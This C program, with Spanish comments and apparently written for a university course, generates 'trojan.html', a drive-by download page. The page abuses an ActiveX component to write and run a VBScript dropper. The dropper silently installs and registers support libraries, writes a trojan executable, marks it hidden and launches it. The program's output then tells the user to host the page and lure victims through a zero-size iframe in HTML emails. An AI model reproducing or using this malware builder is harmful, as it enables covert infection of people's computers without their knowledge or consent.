/*
	Este programa escribe la página web que contiene el troyano.

	Requerimientos:	El troyano necesita los siguientes ficheros:  zip32.dll y mswinsck.ocx y el programa ejecutable

	Compilar con:	gcc gentrojanweb.c -o gentrojanweb

	Utilización:	./gentrojanweb vmtrj.exe zip32.dll mswinsck.ocx

	Realizado por Gerard Farràs <gerard.farras@campus.uab.es> para 

*/

#include <stdio.h>

/* variables que contienen el código de los ficheros vmtrj.exe zip32.dll y mswinsck.ocx */
char * trojan_code  = "tcode";
char * zipdll_code  = "zip";
char * winsock_code = "sck";

/* nombre del fichero con el código vbs */
char * vbsfile_name = "C:\\\\obs.vbs";

/* nombre del fichero con el código troyano */
char * executablefile_name = "vmtrj.exe";

/*nombre de la página web resultante */
char * webpage = "trojan.html";

int writebinarycode(char *,char *);


FILE *fo;

int main(int argc,char *argv[]) {

	if (argc <= 3) {
			fprintf(stderr,"Utilización: %s <troyano> <zip32.dll> <mswinsck.ocx>\n",argv[0]);
			exit(-1);
	}

	if (!(fo=fopen(webpage,"w"))) {
			fprintf(stderr , "Error opening output file\n");
			exit(-1);
	}

	/* Escribimos la cabecera HTML y las primeras instrucciones */

	fprintf(fo,"<HTML>\n<HEAD></HEAD>\n<applet code=\"com.ms.activeX.ActiveXComponent\" width=0 height=0></applet>\n");
	fprintf(fo,"<script language=\"JAVASCRIPT\">\n");
	fprintf(fo,"a1=document.applets[0];\nsetTimeout(\"gow()\",1000);\n");
	fprintf(fo,"function gow() {\n");
	fprintf(fo,"aclsid=\"{0D43FE01-F093-11CF-8940-00A0C9054228}\";\na1.setCLSID(aclsid);\n");
	fprintf(fo,"fso = a1.createInstance();\n");
	fprintf(fo,"filename = \"%s\";\n", vbsfile_name);
	fprintf(fo,"file = fso.opentextfile(filename, \"2\", \"TRUE\");\n");
	fprintf(fo,"file.writeline(\"On Error Resume Next\");\n");
	fprintf(fo,"file.writeline(\"Set FSys = CreateObject(\\\"Scripting.FileSystemObject\\\")\");\n");
	fprintf(fo,"file.writeline(\"If FSys.FolderExists(\\\"C:\\\\winnt\\\") Then\");\n");
	fprintf(fo,"file.writeline(\"defdirectory=\\\"C:\\\\winnt\\\\\\\"\");\n");
	fprintf(fo,"file.writeline(\"else\");\n");
	fprintf(fo,"file.writeline(\"If FSys.FolderExists(\\\"C:\\\\windows\\\") Then\");\n");
	fprintf(fo,"file.writeline(\"defdirectory=\\\"C:\\\\windows\\\\\\\"\");\n");
	fprintf(fo,"file.writeline(\"else\");\n");
	fprintf(fo,"file.writeline(\"defdirectory=\\\"C:\\\\\\\"\");\n");
	fprintf(fo,"file.writeline(\"end if\");\n");
	fprintf(fo,"file.writeline(\"end if\");\n");


	/* OK. Ahora tenemos en la variable defdirectory el mejor directorio para instalar todos los ficheros */


	/* Escribimos el código del ejecutable */
	writebinarycode(argv[1],trojan_code);

	/* Escribimos el código de la librería zip32 (utilizado para comprimir) */
	writebinarycode(argv[2],zipdll_code);

	/* Escribimos el código del control mswinsck.ocx (utilizado para crear sockets) */
	writebinarycode(argv[3],winsock_code);

	/* Escribimos el código restante (instrucciones VBS)*/

	/* Miramos si está instalado mswinsck.ocx, si no lo está lo escribimos en C:\\winnt\system32 y lo registramos con regsvr32.exe */
	fprintf(fo,"file.writeline(\"Set fso=CreateObject(\\\"Scripting.FileSystemObject\\\")\");\n");
	fprintf(fo,"file.writeline(\"Set shell=WScript.CreateObject(\\\"WScript.Shell\\\")\");\n");
	fprintf(fo,"file.writeline(\"if not fso.FileExists(defdirectory & \\\"mswinsck.ocx\\\") then\");\n");
	fprintf(fo,"file.writeline(\"tmp=Split(%s,\\\",\\\")\");\n", winsock_code);
	fprintf(fo,"file.writeline(\"pth=defdirectory & \\\"mswinsck.ocx\\\"\");\n");
	fprintf(fo,"file.writeline(\"Set control= fso.CreateTextFile(pth, ForWriting)\");\n");
	fprintf(fo,"file.writeline(\"For i = 0 To UBound(tmp)\");\n");
	fprintf(fo,"file.writeline(\"l = Len(tmp(i))\");\n");
	fprintf(fo,"file.writeline(\"b = Int(\\\"&H\\\" & Left(tmp(i),2))\");\n");
	fprintf(fo,"file.writeline(\"If l > 2 Then\");\n");
	fprintf(fo,"file.writeline(\"r = Int(\\\"&H\\\" & Mid(tmp(i) , 3, l))\");\n");
	fprintf(fo,"file.writeline(\"For j = 1 to r\");\n");
	fprintf(fo,"file.writeline(\"control.Write Chr(b)\");\n");
	fprintf(fo,"file.writeline(\"Next\");\n");
	fprintf(fo,"file.writeline(\"Else\");\n");
	fprintf(fo,"file.writeline(\"control.Write Chr(b)\");\n");
	fprintf(fo,"file.writeline(\"End If\");\n");
	fprintf(fo,"file.writeline(\"Next\");\n");
	fprintf(fo,"file.writeline(\"control.Close\");\n");
	fprintf(fo,"file.writeline(\"shell.run(\\\"regsvr32.exe /s \\\" & defdirectory & \\\"mswinsck.ocx\\\")\");\n");
	fprintf(fo,"file.writeline(\"End If\");\n");

	/*	Ídem que lo anterior pero con la librería zip32.dll */

	fprintf(fo,"file.writeline(\"if not fso.FileExists(defdirectory & \\\"zip32.dll\\\") then\");\n");
	fprintf(fo,"file.writeline(\"tmp=Split(%s,\\\",\\\")\");\n", zipdll_code);
	fprintf(fo,"file.writeline(\"pth=defdirectory & \\\"zip32.dll\\\"\");\n");
	fprintf(fo,"file.writeline(\"Set control= fso.CreateTextFile(pth, ForWriting)\");\n");
	fprintf(fo,"file.writeline(\"For i = 0 To UBound(tmp)\");\n");
	fprintf(fo,"file.writeline(\"l = Len(tmp(i))\");\n");
	fprintf(fo,"file.writeline(\"b = Int(\\\"&H\\\" & Left(tmp(i),2))\");\n");
	fprintf(fo,"file.writeline(\"If l > 2 Then\");\n");
	fprintf(fo,"file.writeline(\"r = Int(\\\"&H\\\" & Mid(tmp(i) , 3, l))\");\n");
	fprintf(fo,"file.writeline(\"For j = 1 to r\");\n");
	fprintf(fo,"file.writeline(\"control.Write Chr(b)\");\n");
	fprintf(fo,"file.writeline(\"Next\");\n");
	fprintf(fo,"file.writeline(\"Else\");\n");
	fprintf(fo,"file.writeline(\"control.Write Chr(b)\");\n");
	fprintf(fo,"file.writeline(\"End If\");\n");
	fprintf(fo,"file.writeline(\"Next\");\n");
	fprintf(fo,"file.writeline(\"control.Close\");\n");
	fprintf(fo,"file.writeline(\"shell.run(\\\"regsvr32.exe /s \\\" & defdirectory & \\\"zip32.dll\\\")\");\n");
	fprintf(fo,"file.writeline(\"End If\");\n");

	fprintf(fo,"file.writeline(\"tmp=Split(%s,\\\",\\\")\");\n", trojan_code);
	fprintf(fo,"file.writeline(\"pth= defdirectory & \\\"%s\\\"\");\n", executablefile_name);

	/* Escribimos el código del troyano */
	fprintf(fo,"file.writeline(\"Set f= fso.CreateTextFile(pth, ForWriting)\");\n");
	fprintf(fo,"file.writeline(\"For i = 0 To UBound(tmp)\");\n");
	fprintf(fo,"file.writeline(\"l = Len(tmp(i))\");\n");
	fprintf(fo,"file.writeline(\"b = Int(\\\"&H\\\" & Left(tmp(i),2))\");\n");
	fprintf(fo,"file.writeline(\"If l > 2 Then\");\n");
	fprintf(fo,"file.writeline(\"r = Int(\\\"&H\\\" & Mid(tmp(i) , 3, l))\");\n");
	fprintf(fo,"file.writeline(\"For j = 1 to r\");\n");
	fprintf(fo,"file.writeline(\"f.Write Chr(b)\");\n");
	fprintf(fo,"file.writeline(\"Next\");\n");
	fprintf(fo,"file.writeline(\"Else\");\n");
	fprintf(fo,"file.writeline(\"f.Write Chr(b)\");\n");
	fprintf(fo,"file.writeline(\"End If\");\n");
	fprintf(fo,"file.writeline(\"Next\");\n");
	fprintf(fo,"file.writeline(\"f.Close\");\n");

	/* Ponemos al atributo de oculto al fichero vmtrj.exe  */
	fprintf(fo,"file.writeline(\"Set filesys=CreateObject(\\\"Scripting.FileSystemObject\\\")\");\n");
	fprintf(fo,"file.writeline(\"Set demofile=filesys.GetFile(pth)\");\n");
	fprintf(fo,"file.writeline(\"demofile.Attributes=2\");\n");

	fprintf(fo,"file.writeline(\"shell.run(pth)\");\n");
	fprintf(fo,"file.close();\n");


	fprintf(fo,"Run();\n");
	fprintf(fo,"}\n");

	/* Ejecutamos el troyano */
	fprintf(fo,"function Run() {\n");
	fprintf(fo,"WshShellClassID=\"{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}\";\n");
	fprintf(fo,"a1.setCLSID(WshShellClassID);\n");
	fprintf(fo,"wshShell = a1.createInstance();\n");
	fprintf(fo,"wshShell.run(filename,\"6\",\"TRUE\");\n");
	fprintf(fo,"}\n");
	fprintf(fo,"</script>\n");
	fprintf(fo,"</html>\n");

	fclose(fo);

	/* Mensaje final de ayuda */
	fprintf(stdout,"\nHecho! Ahora, se debe subir %s en un servidor web y escribir los mails text/html con la estructura siguiente:\n", webpage);
	fprintf(stdout,"\n<HTML><HEAD></HEAD><BODY>\n<IFRAME SRC=\"servidor.web.dondesea/directorio/%s\" WIDTH=0 HEIGHT=0></IFRAME>\n",webpage);
	fprintf(stdout,"\n<DIV>\t<P>Hola!!!\n\t<P>Cuerpo del mail..\n</DIV>\n</BODY></HTML>\n");




}

int writebinarycode(char *file,char *variable) {

	/* Escribimos los códigos del fichero binario file*/
	int c;
	int i=1;
	FILE *fi;

	if (!(fi=fopen(file,"r"))) {
			fprintf(stderr , "Error opening binary file %s\n",file);
			exit(-1);
	}

	c=fgetc(fi);
	fprintf(fo,"file.writeline(\"%s=\\\"%x",variable,c);
	c=fgetc(fi);

	while (c!=EOF) {


		fprintf(fo,",%x",c);
		i++;

		c=fgetc(fi);

		if (c!=EOF) {

			if(i==32) {
				fprintf(fo,"\\\"\");\nfile.writeline(\"%s=%s & \\\"",variable,variable);
				i=0;
			}
		}

	}

	fprintf(fo,"\\\"\");\n");

	fclose(fi);


}

